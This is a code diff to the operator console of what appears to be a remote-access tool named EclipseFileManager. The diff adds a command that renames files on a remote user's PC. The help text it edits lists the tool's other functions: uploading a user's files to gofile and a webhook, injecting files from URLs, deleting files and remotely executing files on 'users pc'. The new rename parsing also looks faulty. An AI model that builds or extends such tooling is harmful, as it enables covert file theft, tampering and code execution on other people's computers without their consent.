@@ -7,7 +7,7 @@ from threading import Thread
 import json
 import time
 
-__serverIP__ = ''  #IP Address of host
+__serverIP__ = ''  # IP Address of host
 __PORT__ = ""  # leave this blank if u don't know what it means
 
 
@@ -59,6 +59,9 @@ class Modules(Util):
     def update(this):
         this.send('update|')
 
+    def rename(this, path, name, newname):
+        this.send(f'rename|{this.format(path, name)}|{newname}')
+
     def browse_json(this, data, path=[]):
         if isinstance(data, dict):
             print(f'Current directory: {"/".join(path)}/')
@@ -98,12 +101,11 @@ class Modules(Util):
                         '\n\nMANAGEMENT:'
                         '\n"Download [FILE/DIRECTORY]": uploads file/directory to gofile and sends it to a webhook'
                         '\n"Update": Updates data'
-                        '\n"Inject [FILE] URL]:": Injects a file to a specified path on users pc'
-                        '\n"Delete [PATH]": Deletes a in a directory/file'
-                        '\n"Remote Execute [PATH]": "Executes a file on users PC"'
-                        
-                        '\n\nSETTINGS:'
-                        '\n"Uninstall": "Uninstalls EclipseFileManager on users PC"')
+                        '\n"Inject [FILE URL]:": Injects a file to a specified path on users pc'
+                        '\n"Delete [FILE/DIRECTORY]": Deletes a in a directory/file'
+                        '\n"Remote Execute [FILE]": "Executes a file on users PC"'
+                        '\n"Rename" [FILE/DIRECTORY] [NEW NAME]: "Renames a file/directory"'
+                    )
                 elif dir.lower() == 'q':
                     return
                 elif dir == '..':
@@ -137,6 +139,11 @@ class Modules(Util):
 
                 elif dir.lower() == 'update':
                     this.update()
+
+                elif dir.lower().startswith('rename') and dir.split(" ", 1)[0] in data:
+                    newname_location = len(dir.split(" "))
+                    this.rename(path, dir.split(" ", 1)[0], dir.split(" ")[newname_location])
+                    this.browse_json(data, path=path[:])
 
                 else:
                     print('Invalid command/directory')
